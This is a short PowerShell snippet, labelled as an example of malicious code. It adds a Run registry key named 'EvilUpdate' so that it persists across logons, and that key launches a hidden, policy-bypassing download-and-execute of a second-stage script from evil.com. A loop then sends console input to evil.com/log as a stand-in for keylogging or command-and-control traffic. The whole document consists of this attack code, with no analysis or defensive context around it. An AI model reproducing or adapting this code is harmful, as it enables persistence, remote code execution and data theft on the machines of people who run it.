# Example memory-resident malicious code
$key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$value = "EvilUpdate"
$cmd = "powershell -ep bypass -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1')"
Set-ItemProperty -Path $key -Name $value -Value $cmd

# Do something malicious (e.g., log keystrokes or ping C2 server)
while ($true) {
    $data = [Console]::ReadLine()
    IWR -Uri "http://evil.com/log" -Method POST -Body $data -UseBasicParsing
}
